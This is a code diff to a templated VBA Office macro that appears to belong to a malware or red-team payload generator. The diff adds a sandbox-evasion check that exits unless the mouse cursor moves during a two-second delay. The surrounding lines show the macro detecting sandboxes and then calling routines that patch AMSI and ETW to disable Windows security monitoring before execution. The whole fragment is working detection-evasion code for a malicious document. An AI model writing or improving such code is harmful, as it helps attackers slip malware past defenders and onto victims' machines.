@@ -16,6 +16,7 @@ Option Explicit
     Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As LongPtr
     Private Declare PtrSafe Function GetProcAddress Lib "kernel32" _
         (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+    Private Declare PtrSafe Function GetCursorPos Lib "user32" (lpPoint As Any) As Long
 #End If
 
 Private Function {{ v.fn_build_str }}(codes() As Integer) As String
@@ -140,9 +141,14 @@ End Function
 
 Private Sub {{ v.fn_exec }}()
     If {{ v.fn_sandbox }}() Then Exit Sub
+    ' Record cursor before delay; check movement after — no extra wait
+    Dim _pt1(1) As Long, _pt2(1) As Long
+    GetCursorPos _pt1(0)
     ' Execution delay to defeat sandbox timing
     Dim tStart As Date: tStart = Now
     Do While DateDiff("s", tStart, Now) < 2: DoEvents: Loop
+    GetCursorPos _pt2(0)
+    If _pt1(0) = _pt2(0) And _pt1(1) = _pt2(1) Then Exit Sub
     Call {{ v.fn_amsi_patch }}
     Call {{ v.fn_etw_patch }}
 
